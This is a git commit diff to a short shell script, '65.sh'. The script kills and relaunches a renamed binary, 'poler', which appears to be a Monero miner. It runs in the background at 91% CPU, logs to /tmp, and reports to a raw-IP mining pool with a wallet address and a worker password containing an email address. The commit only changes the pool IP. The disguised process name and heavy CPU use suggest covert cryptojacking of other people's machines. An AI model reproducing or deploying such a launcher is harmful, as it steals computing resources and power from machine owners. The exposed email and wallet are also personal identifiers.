cd18a76ebb8c251a5cd103b78b1953c63402c44f
today100not <56802907+today100not@users.noreply.github.com>
2019-10-21 18:10:38 -0400

    Update 65.sh

--- 65.sh
+++ 65.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 91 --cpu-priority 3 -o 185.209.29.249:5971 -u 43HBsr8PDEacn2yLSc18dC6GMAaPstvL9JRN2i9qU6Cpb55cB4uEmVxBfztkrKiPZB3WuKUKRgXQ47noMrdo42zbHqjpYH6 --pass=w15-ekonomka:robbertopp1@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 91 --cpu-priority 3 -o 165.227.5.40:5522 -u 43HBsr8PDEacn2yLSc18dC6GMAaPstvL9JRN2i9qU6Cpb55cB4uEmVxBfztkrKiPZB3WuKUKRgXQ47noMrdo42zbHqjpYH6 --pass=w15-ekonomka:robbertopp1@gmail.com -k
